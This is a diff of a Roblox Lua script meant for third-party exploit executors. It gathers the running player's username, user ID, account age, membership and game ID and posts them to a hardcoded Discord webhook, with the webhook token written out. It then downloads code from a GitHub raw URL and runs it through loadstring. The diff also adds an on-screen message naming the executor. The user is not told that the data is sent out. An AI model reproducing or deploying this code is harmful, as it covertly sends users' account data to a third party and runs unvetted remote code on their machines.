@@ -1,10 +1,8 @@
 local webhookUrl = "https://discord.com/api/webhooks/1314891658092875789/elAqUPdAWVAPp7fZRdIOTTDpgf1kOdUmm8dqvKGbWHfjRyY7MG3VU_Z5pY60_hKv_mZN"
-
 local player = game:GetService("Players").LocalPlayer
 local exploit = identifyexecutor() or "Unknown"
 
-local robloxId = 2932844883  
-
+local robloxId = 2932844883
 local membershipType = "None"
 if player.MembershipType == Enum.MembershipType.Premium then
     membershipType = "Premium"
@@ -19,7 +17,7 @@ local data = {
                 { name = "Display Name", value = player.DisplayName, inline = true },
                 { name = "Username", value = player.Name, inline = true },
                 { name = "User ID", value = tostring(player.UserId), inline = true },
-                { name = "Roblox ID", value = tostring(robloxId), inline = true },  -- Ton ID Roblox ici
+                { name = "Roblox ID", value = tostring(robloxId), inline = true },
                 { name = "Account Age", value = tostring(player.AccountAge) .. " days", inline = true },
                 { name = "Membership Status", value = membershipType, inline = true },
                 { name = "Game ID", value = tostring(game.PlaceId), inline = true },
@@ -33,12 +31,26 @@ local data = {
 local headers = { ["Content-Type"] = "application/json" }
 local request = http_request or request or HttpPost or syn.request
 
+
 request({
     Url = webhookUrl,
     Body = game:GetService("HttpService"):JSONEncode(data),
     Method = "POST",
     Headers = headers
 })
+
+
+local gui = Instance.new("ScreenGui")
+gui.Parent = player:WaitForChild("PlayerGui")
+
+local label = Instance.new("TextLabel")
+label.Parent = gui
+label.Size = UDim2.new(0, 200, 0, 50)
+label.Position = UDim2.new(0.5, -100, 0.5, -25) 
+label.Text = "Script exécuté sur " .. exploit
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+label.TextScaled = true
 
 local success, result = pcall(function()
     return loadstring(game:HttpGet("https://raw.githubusercontent.com/azenbest/test/refs/heads/main/main.lua"))()
